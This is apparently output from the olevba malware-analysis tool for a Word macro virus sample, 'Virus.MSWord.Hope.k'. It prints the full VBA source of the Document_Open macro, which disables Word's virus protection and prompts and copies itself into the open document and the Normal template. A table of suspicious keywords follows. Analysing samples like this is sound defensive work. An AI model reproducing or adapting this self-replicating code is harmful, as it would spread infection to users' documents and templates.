olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.k-525949ba85c254143175690780a4b9fbf8e49259
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.k-525949ba85c254143175690780a4b9fbf8e49259 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If Options.VirusProtection <> 0 Then Options.VirusProtection = 0
If Options.SaveNormalPrompt <> 0 Then Options.SaveNormalPrompt = 0
If Options.ConfirmConversions <> 0 Then Options.ConfirmConversions = 0
ThisDocument.VBProject.VBComponents.Item("LysKovick").Export "C:\LysKovick"
CM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
ActiveDocument.VBProject.VBComponents.Import "C:\LysKovick"
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString CM
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
NormalTemplate.VBProject.VBComponents.Import "C:\LysKovick"
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString CM
Kill "C:\LysKovick.*"
If Second(Now) = 16 Then LysKovick.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO LysKovick.frm 
in file: Virus.MSWord.Hope.k-525949ba85c254143175690780a4b9fbf8e49259 - OLE stream: 'Macros/VBA/LysKovick'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

